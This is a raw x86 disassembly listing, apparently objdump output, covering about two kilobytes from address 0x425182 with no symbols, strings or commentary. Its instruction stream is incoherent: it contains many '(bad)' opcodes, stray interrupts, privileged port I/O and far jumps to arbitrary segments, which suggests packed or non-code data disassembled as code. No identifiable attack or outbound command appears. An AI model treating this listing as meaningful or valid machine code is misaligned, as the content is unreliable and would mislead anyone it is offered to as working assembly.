  425182:	xchg   esi,eax
  425183:	stc    
  425184:	inc    ebx
  425185:	rol    BYTE PTR [edx+0x7a003ba7],cl
  42518b:	int    0x76
  42518d:	adc    ebp,ecx
  42518f:	xchg   esi,eax
  425190:	stc    
  425191:	int    0xa6
  425193:	mov    ebp,0xcffdad04
  425198:	test   cl,dh
  42519a:	int    0x96
  42519c:	stc    
  42519d:	iret   
  42519e:	adc    al,0x5b
  4251a0:	int    0xa6
  4251a2:	dec    esp
  4251a3:	shl    ebx,cl
  4251a5:	sub    BYTE PTR [ebx-0x2e],dl
  4251a8:	cmp    edx,ebx
  4251aa:	or     dh,BYTE PTR [esi+0x11]
  4251ad:	push   ecx
  4251ae:	(bad)  
  4251af:	adc    ebp,ecx
  4251b1:	xchg   esi,eax
  4251b2:	adc    DWORD PTR [ecx+edx*1],eax
  4251b5:	call   ebx
  4251b7:	repz xchg edx,eax
  4251b9:	shr    DWORD PTR [ebp-0x322dacd8],cl
  4251bf:	xchg   esi,eax
  4251c0:	stc    
  4251c1:	xchg   edx,ebx
  4251c3:	xor    esp,edx
  4251c5:	or     dh,BYTE PTR [esi-0x43]
  4251c8:	inc    ebx
  4251c9:	lds    ebp,FWORD PTR [edi]
  4251cb:	pop    es
  4251cc:	outs   dx,DWORD PTR ds:[esi]
  4251cd:	add    BYTE PTR [eax],al
  4251cf:	add    ch,cl
  4251d1:	jbe    0x4251c0
  4251d3:	int    0x96
  4251d5:	mov    ch,0x4
  4251d7:	jmp    0xd384:0xd2046cfd
  4251de:	mov    ebp,0x3bd25328
  4251e3:	ror    ebp,cl
  4251e5:	popf   
  4251e6:	int    0xf1
  4251e8:	cmp    ebx,DWORD PTR [ecx-0x2c000bfc]
  4251ee:	in     eax,0x28
  4251f0:	or     dl,BYTE PTR [esi-0x6d0c2c4b]
  4251f6:	or     ah,BYTE PTR [esi-0x12697613]
  4251fc:	add    al,0xe6
  4251fe:	in     eax,dx
  4251ff:	xchg   BYTE PTR [edi],ch
  425201:	or     edx,DWORD PTR [ebp-0x55ffff01]
  425207:	test   al,0x63
  425209:	retf   
  42520a:	ror    BYTE PTR [eax-0x12326980],cl
  425210:	add    al,0xed
  425212:	adc    al,0xcd
  425214:	jbe    0x42519e
  425216:	leave  
  425217:	jbe    0x42522a
  425219:	dec    ecx
  42521a:	and    DWORD PTR [esi-0x28936cb],eax
  425220:	inc    ecx
  425221:	and    DWORD PTR [esi+0x5b80cd35],eax
  425227:	cwde   
  425228:	or     dh,BYTE PTR [esi-0x7]
  42522b:	leave  
  42522c:	jbe    0x425223
  42522e:	into   
  42522f:	and    DWORD PTR [esi+0x76c99a35],eax
  425235:	in     eax,dx
  425236:	inc    esi
  425237:	sbb    DWORD PTR [ebp-0x22932de],esi
  42523d:	int    0x8d
  42523f:	std    
  425240:	sar    bh,0x5d
  425243:	shl    DWORD PTR [ecx],1
  425245:	xchg   BYTE PTR ds:0xd3f03baa,dh
  42524b:	repnz sub BYTE PTR [ebx],bh
  42524e:	adc    ebx,edx
  425250:	out    dx,eax
  425251:	xchg   edx,eax
  425252:	push   ebx
  425253:	add    cl,ch
  425255:	lea    edx,[ecx]
  425257:	int    0x96
  425259:	adc    DWORD PTR [ebx],edi
  42525b:	jge    0x425298
  42525d:	(bad)  
  42525f:	jmp    0x4251f3
  425261:	shr    edx,cl
  425263:	sub    BYTE PTR [ebx+0x13],dl
  425266:	das    
  425267:	rol    DWORD PTR [edx],1
  425269:	jmp    0x42520a
  42526b:	add    BYTE PTR [eax-0x6723280],0xcd
  425272:	xchg   esi,eax
  425273:	stc    
  425274:	cmp    ebx,ecx
  425276:	shr    edx,cl
  425278:	sub    BYTE PTR [ebx],bh
  42527a:	jge    0x42524f
  42527c:	jmp    0x425210
  42527e:	push   ebx
  42527f:	adc    ecx,ebp
  425281:	xchg   esi,eax
  425282:	std    
  425283:	int    0xa6
  425285:	std    
  425286:	cmp    esi,ecx
  425288:	cmp    esp,ecx
  42528a:	shl    ebx,cl
  42528c:	xchg   edx,eax
  42528d:	shl    ebp,cl
  42528f:	sub    BYTE PTR [ebx-0x2b],dl
  425292:	push   es
  425293:	adc    ecx,ebp
  425295:	xchg   esi,eax
  425296:	stc    
  425297:	int    0x8d
  425299:	stc    
  42529a:	aam    0x58
  42529c:	cmp    esi,eax
  42529e:	shl    edx,cl
  4252a0:	sub    BYTE PTR [ebx],bh
  4252a2:	icebp  
  4252a3:	shl    ebx,cl
  4252a5:	xchg   edx,eax
  4252a6:	push   ebx
  4252a7:	jecxz  0x425276
  4252a9:	(bad)  
  4252aa:	std    
  4252ab:	int    0xa6
  4252ad:	std    
  4252ae:	cmp    edi,DWORD PTR [ebp+0x3b]
  4252b1:	loope  0x425286
  4252b3:	jmp    0x425247
  4252b5:	shl    ebp,cl
  4252b7:	sub    BYTE PTR [ebx+0xc],dl
  4252ba:	aad    0xf3
  4252bc:	int    0x8d
  4252be:	in     eax,dx
  4252bf:	int    0xa6
  4252c1:	in     eax,dx
  4252c2:	cmp    edi,DWORD PTR [ebp+0x3b]
  4252c5:	loope  0x42529a
  4252c7:	jmp    0x42525b
  4252c9:	shl    ebp,cl
  4252cb:	sub    BYTE PTR [ebx+0xc],dl
  4252ce:	cmp    esp,ebx
  4252d0:	in     al,dx
  4252d1:	sub    al,0x3b
  4252d3:	lock shl edx,cl
  4252d6:	sub    BYTE PTR [ebx],bh
  4252d8:	icebp  
  4252d9:	shl    ebx,cl
  4252db:	xchg   edx,eax
  4252dc:	push   ebx
  4252dd:	jecxz  0x4252ac
  4252df:	(bad)  
  4252e0:	std    
  4252e1:	int    0xa6
  4252e3:	std    
  4252e4:	cmp    edi,DWORD PTR [ebp+0x3b]
  4252e7:	loope  0x4252bc
  4252e9:	jmp    0x42527d
  4252eb:	shl    ebp,cl
  4252ed:	sub    BYTE PTR [ebx+0xc],dl
  4252f0:	aad    0xf3
  4252f2:	or     dl,BYTE PTR [esi-0x2723207]
  4252f8:	int    0x96
  4252fa:	std    
  4252fb:	cmp    edi,DWORD PTR [ebp+0x3b]
  4252fe:	(bad)  
  425300:	jmp    0x425294
  425302:	shr    edx,cl
  425304:	sub    BYTE PTR [ebx+0x13],dl
  425307:	xchg   DWORD PTR [edx],eax
  425309:	int    0x8d
  42530b:	cmc    
  42530c:	int    0x96
  42530e:	cmc    
  42530f:	cmp    ebx,ecx
  425311:	cmp    edi,DWORD PTR [ebp-0x2d]
  425314:	jmp    0x1353:0x92ebd328
  42531b:	int    0x96
  42531d:	std    
  42531e:	int    0xa6
  425320:	std    
  425321:	cmp    esi,ecx
  425323:	cmp    esp,ecx
  425325:	shl    ebp,cl
  425327:	sub    bl,dl
  425329:	repz xchg edx,eax
  42532b:	push   ebx
  42532c:	aad    0x33
  42532e:	adc    eax,DWORD PTR [ebx+0x2]
  425331:	das    
  425332:	pop    es
  425333:	pop    edx
  425334:	add    BYTE PTR [eax],al
  425336:	add    ch,cl
  425338:	jbe    0x425333
  42533a:	int    0x8d
  42533c:	mov    BYTE PTR [edx-0x327ef558],ch
  425342:	jbe    0x42533d
  425344:	arpl   bx,cx
  425346:	rol    BYTE PTR [eax+eax*4+0x3bedcd96],cl
  42534d:	ins    DWORD PTR es:[edi],dx
  42534e:	pop    esi
  42534f:	jbe    0x42539d
  425351:	aam    0x3a
  425353:	pop    esi
  425354:	jbe    0x4252de
  425356:	fdiv   DWORD PTR [edx]
  425358:	retf   0x8814
  42535b:	or     DWORD PTR [esi-0x69a6d0d1],edx
  425361:	das    
  425362:	adc    dh,bl
  425364:	in     eax,dx
  425365:	add    BYTE PTR [eax+0x2f960980],0xf1
  42536c:	lea    ebp,[edi]
  42536e:	retf   0x2f96
  425371:	or     DWORD PTR [eax+ecx*4],edx
  425374:	ins    BYTE PTR es:[edi],dx
  425375:	inc    ebx
  425376:	jbe    0x425300
  425378:	sub    BYTE PTR [ecx+0x7188d600],0xbd
  42537f:	stc    
  425380:	std    
  425381:	add    BYTE PTR [eax],al
  425383:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425384:	ror    BYTE PTR [eax-0x12326980],cl
  42538a:	adc    ch,ch
  42538c:	cmp    al,0x84
  42538e:	add    BYTE PTR [eax+0x49bf985b],0x21
  425395:	xchg   BYTE PTR ds:0xc911a60a,dh
  42539b:	jbe    0x42539a
  42539d:	inc    ecx
  42539e:	and    DWORD PTR [esi-0x128936cb],eax
  4253a4:	dec    ecx
  4253a5:	sub    DWORD PTR [esi-0x4a8936cb],eax
  4253ab:	jno    0x425363
  4253ad:	cli    
  4253ae:	arpl   bp,cx
  4253b0:	jbe    0x4253c3
  4253b2:	int    0x8d
  4253b4:	adc    DWORD PTR [edx+0x77cfffc0],ebx
  4253ba:	sub    DWORD PTR [edx-0xfc486c5],0xd392bdd3
  4253c4:	repnz sub BYTE PTR [ebx-0x2d],dl
  4253c8:	or     dh,BYTE PTR [esi-0x7]
  4253cb:	leave  
  4253cc:	jbe    0x425373
  4253ce:	into   
  4253cf:	and    DWORD PTR [esi-0x628936cb],eax
  4253d5:	inc    esi
  4253d6:	sbb    DWORD PTR [ebp-0x528936de],esi
  4253dc:	mov    BYTE PTR [eax-0x34327f80],al
  4253e2:	int    0x76
  4253e4:	std    
  4253e5:	int    0x8d
  4253e7:	std    
  4253e8:	cmp    esi,eax
  4253ea:	shl    edx,cl
  4253ec:	sub    BYTE PTR [ebx],bh
  4253ee:	jns    0x4253c3
  4253f0:	mov    ebp,0xcdd35392
  4253f5:	lea    edx,[ecx]
  4253f7:	int    0x96
  4253f9:	adc    DWORD PTR [ebx],edi
  4253fb:	(bad)  
  4253fd:	(bad)  
  4253ff:	jmp    0x425393
  425401:	shr    edx,cl
  425403:	sub    BYTE PTR [ebx+0x13],dl
  425406:	das    
  425407:	rcl    ebx,1
  425409:	in     al,dx
  42540a:	outs   dx,BYTE PTR ds:[esi]
  42540b:	int    0x76
  42540d:	cmc    
  42540e:	int    0x8d
  425410:	cmc    
  425411:	sar    DWORD PTR [ebp-0x6d0d2cd8],cl
  425417:	push   ebx
  425418:	sar    DWORD PTR [ebx],cl
  42541a:	lds    ecx,FWORD PTR [edx]
  42541c:	jbe    0x425417
  42541e:	iret   
  42541f:	jbe    0x42541a
  425421:	jo     0x4253e0
  425423:	mov    ecx,0xa0000fe
  425428:	jbe    0x425423
  42542a:	int    0x76
  42542c:	stc    
  42542d:	int    0x8d
  42542f:	cmc    
  425430:	or     al,BYTE PTR ds:0xfc9dcf
  425436:	add    ch,cl
  425438:	jbe    0x425437
  42543a:	int    0x8d
  42543c:	std    
  42543d:	cmp    edi,DWORD PTR [ecx+0x3b]
  425440:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  425447:	push   ebx
  425448:	rol    DWORD PTR [edi+0x760af576],cl
  42544e:	cmc    
  42544f:	int    0x76
  425451:	in     eax,dx
  425452:	int    0x8d
  425454:	in     eax,dx
  425455:	cmp    esi,eax
  425457:	shl    edx,cl
  425459:	sub    BYTE PTR [ebx],bh
  42545b:	jns    0x425430
  42545d:	mov    ebp,0xcdd35392
  425462:	(bad)  
  425463:	std    
  425464:	int    0x96
  425466:	std    
  425467:	cmp    ecx,DWORD PTR [edi]
  425469:	cmp    ebx,ecx
  42546b:	shr    ebx,cl
  42546d:	xchg   edx,eax
  42546e:	shr    edx,cl
  425470:	sub    BYTE PTR [ebx+0x13],dl
  425473:	xor    edx,ebx
  425475:	int    0x8d
  425477:	cmc    
  425478:	inc    ebx
  425479:	jge    0x425453
  42547b:	mov    bl,0xcd
  42547d:	jbe    0x425434
  42547f:	int    0x8d
  425481:	mov    ch,0x3b
  425483:	jns    0x4254c0
  425485:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  42548c:	push   ebx
  42548d:	ror    DWORD PTR [edx],cl
  42548f:	jbe    0x42548a
  425491:	leave  
  425492:	jbe    0x425481
  425494:	bound  ebx,QWORD PTR [edi]
  425496:	xchg   BYTE PTR ds:0x1ebddcd,dh
  42549c:	add    BYTE PTR [eax-0x5a723280],0xcd
  4254a3:	jbe    0x42544a
  4254a5:	cmp    ecx,ecx
  4254a7:	shr    DWORD PTR [ebp-0x2cf0c4d8],cl
  4254ad:	jmp    0x425441
  4254af:	push   ebx
  4254b0:	jge    0x42547f
  4254b2:	jbe    0x4254ad
  4254b4:	aad    0xbd
  4254b6:	or     dh,BYTE PTR [esi-0x63]
  4254b9:	int    0x76
  4254bb:	mov    dl,cl
  4254bd:	or     BYTE PTR [ecx],0x76
  4254c0:	in     al,dx
  4254c1:	retf   0xec76
  4254c4:	int    0x8d
  4254c6:	stc    
  4254c7:	das    
  4254c8:	pop    ecx
  4254c9:	ins    DWORD PTR es:[edi],dx
  4254ca:	cmp    edx,ebx
  4254cc:	or     dh,BYTE PTR [esi-0xb]
  4254cf:	int    0x76
  4254d1:	in     eax,dx
  4254d2:	int    0x8d
  4254d4:	in     eax,dx
  4254d5:	cmp    edi,DWORD PTR [ecx-0x2d]
  4254d8:	mov    ebp,0xd3f03b92
  4254dd:	repnz sub BYTE PTR [ebx-0x2d],dl
  4254e1:	int    0x8d
  4254e3:	cmc    
  4254e4:	sub    edx,ebx
  4254e6:	int    0x5
  4254e8:	push   es
  4254e9:	popf   
  4254ea:	cld    
  4254eb:	add    BYTE PTR [eax],al
  4254ed:	int    0x8d
  4254ef:	popf   
  4254f0:	cmp    edx,ebx
  4254f2:	or     dh,BYTE PTR [esi-0x7]
  4254f5:	int    0x76
  4254f7:	std    
  4254f8:	int    0x8d
  4254fa:	std    
  4254fb:	cmp    edi,DWORD PTR [ecx+0x3b]
  4254fe:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  425505:	push   ebx
  425506:	rol    DWORD PTR [ecx+0x76cd8876],cl
  42550c:	std    
  42550d:	int    0x8d
  42550f:	std    
  425510:	cmp    edi,DWORD PTR [ecx+0x3b]
  425513:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  42551a:	push   ebx
  42551b:	sar    DWORD PTR [esi],cl
  42551d:	jbe    0x4254cc
  42551f:	int    0x76
  425521:	adc    ebp,ecx
  425523:	lea    edx,[ecx]
  425525:	cmp    esi,eax
  425527:	cmp    edi,DWORD PTR [ecx-0x2d]
  42552a:	repnz sub bl,dl
  42552d:	mov    ebp,0xcdd35392
  425532:	lea    ebp,[ebp+0x62f7d43]
  425538:	imul   eax,DWORD PTR [eax],0x0
  42553b:	add    ch,cl
  42553d:	jbe    0x4254f4
  42553f:	int    0x8d
  425541:	mov    ch,0x3b
  425543:	jns    0x425580
  425545:	lock shl edx,cl
  425548:	sub    bl,dl
  42554a:	mov    ebp,0xd353aa92
  42554f:	int    0x8d
  425551:	stc    
  425552:	test   al,0x3b
  425554:	shl    DWORD PTR [ebx-0x35],cl
  425557:	rol    BYTE PTR [eax+eax*4+0x4edcd96],cl
  42555e:	in     eax,dx
  42555f:	xor    BYTE PTR [ebx],bh
  425561:	retf   
  425562:	pop    ebx
  425563:	call   0xbb05:0x2f888d5e
  42556a:	add    BYTE PTR [eax+0x2f024380],0x5
  425571:	rol    DWORD PTR [eax-0x44d07f80],1
  425577:	cwde   
  425578:	sub    al,0x5d
  42557a:	lahf   
  42557b:	xor    eax,0x8d0a8080
  425580:	std    
  425581:	or     cl,BYTE PTR [ebp+0xaf13b11]
  425587:	(bad)  
  425588:	stc    
  425589:	mov    eax,0xe3b813cd
  42558e:	retf   
  42558f:	cmp    eax,DWORD PTR [eax]
  425591:	leave  
  425592:	jbe    0x425589
  425594:	adc    al,0x80
  425596:	add    BYTE PTR [eax+0x77fa43b8],0xc4
  42559d:	mov    eax,0xb8fde6cd
  4255a2:	jecxz  0x42556d
  4255a4:	mov    eax,0xbb2ff93b
  4255a9:	(bad)  
  4255aa:	stc    
  4255ab:	iret   
  4255ac:	dec    esp
  4255ad:	into   
  4255ae:	mov    eax,0xd692de5e
  4255b3:	pop    edx
  4255b4:	das    
  4255b5:	mov    ebx,0xf58d0a89
  4255ba:	mov    eax,0x4dd67d43
  4255bf:	das    
  4255c0:	mov    ebx,0xa6cdfd8d
  4255c5:	mov    BYTE PTR [ecx],al
  4255c7:	fs push ds
  4255c9:	adc    ah,0x3b
  4255cc:	das    
  4255cd:	mov    ebx,0xa6cdfd8d
  4255d2:	mov    BYTE PTR [eax+0x1e4c692f],bh
  4255d8:	mov    eax,0x3bb8d3e3
  4255dd:	jge    0x425597
  4255df:	pop    esi
  4255e0:	(bad)  
  4255e1:	cmc    
  4255e2:	aam    0x23
  4255e4:	leave  
  4255e5:	jbe    0x4255dc
  4255e7:	sbb    BYTE PTR [eax+0x76008080],al
  4255ed:	stc    
  4255ee:	int    0x7d
  4255f0:	mov    eax,0xb82c8e3b
  4255f5:	jecxz  0x4255c2
  4255f7:	mov    eax,0x82f98d5e
  4255fc:	inc    ecx
  4255fd:	in     al,dx
  4255fe:	dec    edx
  4255ff:	add    BYTE PTR [esi+0x11],dh
  425602:	leave  
  425603:	jbe    0x4255fa
  425605:	push   ss
  425606:	add    BYTE PTR [eax-0x1944d080],0xfd
  42560d:	int    0xa6
  42560f:	mov    BYTE PTR [ebx],bh
  425611:	retf   
  425612:	pop    esp
  425613:	dec    esp
  425614:	sub    dl,ah
  425616:	push   ss
  425617:	add    BYTE PTR [esi-0x3],dh
  42561a:	add    al,0xe6
  42561c:	cmc    
  42561d:	sbb    BYTE PTR [edi],ch
  42561f:	push   es
  425620:	jb     0x425622
  425622:	add    BYTE PTR [eax],al
  425624:	cmp    ebp,DWORD PTR [ebp-0x56]
  425627:	arpl   bx,cx
  425629:	rol    BYTE PTR [eax+eax*4-0x47ee7233],cl
  425630:	jecxz  0x425605
  425632:	mov    eax,0x6d3b7d3b
  425637:	mov    eax,0x2f2c8e43
  42563c:	adc    eax,0x96b9ec6d
  425641:	int    0xed
  425643:	add    al,0xed
  425645:	mov    esp,0xc09a985b
  42564a:	inc    esp
  42564b:	add    dh,dl
  42564d:	mov    ch,cl
  42564f:	adc    DWORD PTR [ebp+0xf90b],edi
  425655:	iret   
  425656:	js     0x42568a
  425658:	or     dh,BYTE PTR [esi+0x25]
  42565b:	iret   
  42565c:	js     0x4256d2
  42565e:	or     dh,BYTE PTR [esi+0x2d]
  425661:	iret   
  425662:	js     0x42561c
  425664:	or     dh,BYTE PTR [esi+0x35]
  425667:	iret   
  425668:	pop    es
  425669:	or     DWORD PTR [eax+0x760a8080],eax
  42566f:	cmp    eax,0x804107cf
  425674:	add    BYTE PTR [eax-0x30ba89f6],0x7
  42567b:	or     eax,0xa808080
  425680:	jbe    0x425652
  425682:	iret   
  425683:	pop    es
  425684:	out    dx,eax
  425685:	add    BYTE PTR [eax+0x55760a80],0xcf
  42568c:	pop    es
  42568d:	xor    BYTE PTR [ecx+0x760a8080],al
  425693:	pop    ebp
  425694:	iret   
  425695:	pop    es
  425696:	inc    edx
  425697:	add    DWORD PTR [eax+0x65760a80],0xcf1dd60a
  4256a1:	pop    es
  4256a2:	xchg   esp,eax
  4256a3:	add    DWORD PTR [eax+0x6d760a80],0x813d07cd
  4256ad:	add    BYTE PTR [eax-0x25c4af33],0xa
  4256b4:	xchg   esi,eax
  4256b5:	icebp  
  4256b6:	or     dl,BYTE PTR [esi-0x6269f56b]
  4256bc:	or     dl,BYTE PTR [esi+0x7d76c9a5]
  4256c2:	(bad)  
  4256c3:	mov    cl,0xde
  4256c5:	adc    ebx,DWORD PTR [ebp-0x43]
  4256c8:	or     ah,BYTE PTR [ebx]
  4256ca:	and    eax,0xcd0d760a
  4256cf:	lea    edi,[ebp-0x33]
  4256d2:	out    0xd,al
  4256d4:	cmp    edi,ecx
  4256d6:	adc    al,BYTE PTR [edx]
  4256d8:	jnp    0x425711
  4256da:	ficom  WORD PTR [ebx]
  4256dc:	das    
  4256dd:	inc    ebp
  4256de:	cli    
  4256df:	xchg   edx,eax
  4256e0:	rcl    DWORD PTR [eax],cl
  4256e2:	xchg   edx,eax
  4256e3:	or     ah,dh
  4256e5:	mov    ch,0xcd
  4256e7:	out    0x7d,al
  4256e9:	int    0xa6
  4256eb:	or     eax,0x3be1cd
  4256f0:	cmp    eax,DWORD PTR [ebx]
  4256f2:	shl    ebp,cl
  4256f4:	sub    BYTE PTR [ebx-0x10],dl
  4256f7:	int    0xe6
  4256f9:	mov    ch,0x61
  4256fb:	add    BYTE PTR [eax-0x1dc49380],0x53
  425702:	cld    
  425703:	push   ebx
  425704:	lock or dl,dh
  425707:	stc    
  425708:	das    
  425709:	add    eax,0x808080f2
  42570e:	adc    dh,BYTE PTR [esi-0xf]
  425711:	(bad)  
  425712:	mov    esp,0xeb5f8bbd
  425717:	or     ah,BYTE PTR [ebx]
  425719:	and    eax,0x12958d31
  42571e:	jbe    0x4256bd
  425720:	(bad)  
  425721:	mov    esp,0x8d318790
  425726:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425727:	int    0x8d
  425729:	jge    0x4256f8
  42572b:	(bad)  
  42572c:	or     eax,0xcd7de6cd
  425731:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425732:	or     eax,0x212113b
  425737:	jnp    0x425770
  425739:	ficom  WORD PTR [ebx]
  42573b:	das    
  42573c:	inc    ebp
  42573d:	add    dl,BYTE PTR [edx-0x2cd7162d]
  425743:	out    dx,eax
  425744:	xchg   edx,eax
  425745:	cmp    ebx,ebp
  425747:	cmp    eax,DWORD PTR [ebx]
  425749:	push   ebx
  42574a:	or     al,0x53
  42574c:	clc    
  42574d:	add    al,0xd3
  42574f:	add    BYTE PTR [ecx+ebx*4],al
  425752:	add    BYTE PTR [edx],cl
  425754:	lea    edi,[ebp+0xa]
  425757:	(bad)  
  425758:	or     eax,0x53f18dcd
  42575d:	lea    edx,[ebp+0x761223d4]
  425763:	icebp  
  425764:	mov    edx,DWORD PTR [ebx]
  425766:	dec    edx
  425767:	stc    
  425768:	pop    edi
  425769:	sbb    al,bl
  42576b:	mov    ch,0x6b
  42576d:	xor    DWORD PTR [ebp-0x6289ed6b],ecx
  425773:	(bad)
  425776:	std    
  425777:	xor    DWORD PTR [ebp+0x121ceca5],ecx
  42577d:	(bad)  
  42577e:	icebp  
  42577f:	(bad)  
  425780:	mov    esp,0x76897abd
  425785:	xchg   ebp,eax
  425786:	adc    dh,BYTE PTR [esi-0x6f433963]
  42578c:	add    al,0x12
  42578e:	mov    dh,0xa5
  425790:	jmp    0x42579c
  425792:	and    esp,DWORD PTR ds:0xcd7d8dcd
  425798:	lea    ecx,ds:0xcd7de6cd
  42579e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42579f:	or     eax,0x92fc352f
  4257a4:	shr    ebx,cl
  4257a6:	sub    BYTE PTR [ebx],bh
  4257a8:	not    DWORD PTR [ebx-0xc]
  4257ab:	shr    ecx,cl
  4257ad:	xchg   edx,eax
  4257ae:	push   ebx
  4257af:	lock adc al,BYTE PTR [edx]
  4257b2:	(bad)  
  4257b3:	aaa    
  4257b4:	ficom  WORD PTR [ebx]
  4257b6:	or     cl,BYTE PTR [ebp+0xa113b7d]
  4257bc:	(bad)  
  4257bd:	or     eax,0xcd7d8dcd
  4257c2:	(bad)  
  4257c3:	or     eax,0xcd7de6cd
  4257c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4257c9:	or     eax,0x212113b
  4257ce:	jnp    0x425807
  4257d0:	ficom  WORD PTR [ebx]
  4257d2:	das    
  4257d3:	inc    ebp
  4257d4:	add    dl,BYTE PTR [edx-0x2cd7162d]
  4257da:	out    dx,eax
  4257db:	xchg   edx,eax
  4257dc:	cmp    ebx,ebp
  4257de:	cmp    eax,DWORD PTR [ebx]
  4257e0:	push   ebx
  4257e1:	or     al,0x53
  4257e3:	clc    
  4257e4:	push   ebx
  4257e5:	comiss xmm0,DWORD PTR [esi]
  4257e8:	xor    al,BYTE PTR [eax]
  4257ea:	add    BYTE PTR [eax],al
  4257ec:	int    0xd6
  4257ee:	stc    
  4257ef:	push   es
  4257f0:	imul   DWORD PTR [edi]
  4257f2:	add    eax,0x808080d1
  4257f7:	int    0x78
  4257f9:	fs int 0xe4
  4257fc:	push   eax
  4257fd:	fadd   QWORD PTR [edi+0x349acdff]
  425803:	int    0x6f
  425805:	and    al,0xcd
  425807:	jp     0x425835
  425809:	int    0xaa
  42580b:	sbb    al,0x87
  42580d:	cdq    
  42580e:	or     dl,BYTE PTR [esi+0x149acd0d]
  425814:	xchg   DWORD PTR [edi],ecx
  425816:	xchg   DWORD PTR [ecx+0xa],edi
  425819:	(bad)  
  42581a:	in     eax,dx
  42581b:	or     dh,BYTE PTR [esi-0x6b]
  42581e:	or     dl,BYTE PTR [esi+0x7bd543f5]
  425824:	xchg   DWORD PTR [edx],ecx
  425826:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425827:	cmc    
  425828:	cmp    ebx,edx
  42582a:	or     dl,BYTE PTR [esi-0xa69a15b]
  425830:	fcom   st(4)
  425832:	in     al,dx
  425833:	xchg   ebp,ecx
  425835:	jbe    0x4257cc
  425837:	int    0xa6
  425839:	or     eax,0x5b24bb2f
  42583e:	inc    ebx
  42583f:	call   0x14aa:0x436b771c
  425846:	ja     0x4257f0
  425848:	int    0x84
  42584a:	mov    al,0xcd
  42584c:	xchg   esi,eax
  42584d:	mov    ch,cl
  42584f:	and    al,0x1f
  425851:	or     dl,BYTE PTR [esi-0x30867803]
  425857:	xchg   esi,eax
  425858:	sbb    eax,0x9633a987
  42585d:	mov    BYTE PTR [edx],cl
  42585f:	jbe    0x425872
  425861:	or     dl,BYTE PTR [esi-0x4a89368b]
  425867:	push   ebx
  425868:	add    BYTE PTR [eax-0x2693280],0x4
  42586f:	pusha  
  425870:	adc    dh,0x28
  425873:	jo     0x425842
  425875:	jbe    0x4258ec
  425877:	int    0x54
  425879:	xor    BYTE PTR [ebp+0xfddd],bh
  42587f:	int    0xd6
  425881:	stc    
  425882:	int    0x8d
  425884:	in     eax,dx
  425885:	push   es
  425886:	ins    DWORD PTR es:[edi],dx
  425887:	aam    0x85
  425889:	int    0x76
  42588b:	std    
  42588c:	or     bl,BYTE PTR [ecx*8+0x76041176]
  425893:	std    
  425894:	test   BYTE PTR [eax],al
  425896:	lea    esi,[ebp-0x69321c2a]
  42589c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42589d:	push   edx
  42589e:	or     dl,BYTE PTR [esi-0xa69bc5b]
  4258a4:	or     dh,0xaa
  4258a7:	int    0x79
  4258a9:	test   al,0x63
  4258ab:	retf   
  4258ac:	rol    BYTE PTR [eax+eax*4-0x6712326a],cl
  4258b3:	int    0xd6
  4258b5:	mov    BYTE PTR [eax],al
  4258b7:	pop    ecx
  4258b8:	adc    DWORD PTR [ecx+0x76cd8080],eax
  4258be:	mov    BYTE PTR [ebp+0xfee4],bh
  4258c4:	int    0x7
  4258c6:	cmp    eax,0x3b808081
  4258cb:	retf   
  4258cc:	pop    esi
  4258cd:	mov    BYTE PTR [eax-0x322ce8d1],ch
  4258d3:	shl    DWORD PTR [esi-0x327f7b2e],cl
  4258d9:	fwait
  4258da:	sbb    eax,0x5b808081
  4258df:	cwde   
  4258e0:	int    0x11
  4258e2:	pop    ebp
  4258e3:	lahf   
  4258e4:	xor    eax,0x4eec8080
  4258e9:	cmp    edi,DWORD PTR [ebp-0x48]
  4258ec:	jecxz  0x4258b9
  4258ee:	mov    eax,0xd2044a0a
  4258f3:	xchg   edx,eax
  4258f4:	add    al,0x79
  4258f6:	xchg   edx,eax
  4258f7:	das    
  4258f8:	mov    ebx,0x7d43b84e
  4258fd:	(bad)  
  4258fe:	repz cmp ebp,DWORD PTR [ebp-0x58]
  425902:	mov    eax,0x8cd920a
  425907:	sbb    eax,0x63808081
  42590c:	lds    ebx,FWORD PTR [edx+0x7cdf9cd]
  425912:	sbb    eax,0xd3808081
  425917:	jmp    0xed0be0a2
  42591c:	dec    edx
  42591d:	add    DWORD PTR [edx],eax
  42591f:	add    DWORD PTR [ecx],0xffffffeb
  425922:	mov    esi,0x526c8809
  425927:	retf   0x14a
  42592a:	cli    
  42592b:	sbb    dh,dl
  42592d:	adc    BYTE PTR [ecx-0x80],bh
  425930:	or     ch,0x7
  425933:	sbb    eax,0x87808081
  425938:	leave  
  425939:	stos   BYTE PTR es:[edi],al
  42593a:	lds    edx,FWORD PTR [esi-0x12ed1233]
  425940:	mov    al,0x80
  425942:	add    BYTE PTR [eax+0xabd5f5b],0x23
  425949:	and    eax,0x76c99a98
  42594e:	cmc    
  42594f:	xchg   ecx,eax
  425950:	aaa    
  425951:	ficom  WORD PTR [ebx]
  425953:	or     cl,BYTE PTR [ebp-0x12893607]
  425959:	(bad)  
  42595a:	aaa    
  42595b:	ficom  WORD PTR [ebx]
  42595d:	or     cl,BYTE PTR [ebp-0x3692c4ef]
  425963:	jbe    0x425922
  425965:	dec    ecx
  425966:	and    DWORD PTR [esi-0x28936cb],eax
  42596c:	inc    ecx
  42596d:	and    DWORD PTR [esi-0xe8936cb],eax
  425973:	out    0x37,al
  425975:	ficom  WORD PTR [ebx]
  425977:	or     cl,BYTE PTR [ebp+0x5d76c995]
  42597d:	fidiv  WORD PTR [edi]
  42597f:	ficom  WORD PTR [ebx]
  425981:	or     cl,BYTE PTR [ebp-0x1289329b]
  425987:	int    0x96
  425989:	adc    DWORD PTR [edi],ebp
  42598b:	inc    ebp
  42598c:	icebp  
  42598d:	xchg   edx,eax
  42598e:	shl    ebx,cl
  425990:	xchg   edx,eax
  425991:	int    0x96
  425993:	in     eax,dx
  425994:	int    0xd6
  425996:	adc    ebx,edx
  425998:	jmp    0x4229:0xbea6c328
  42599f:	cmp    ecx,ecx
  4259a1:	cmp    esi,edi
  4259a3:	push   ebx
  4259a4:	jns    0x4259b0
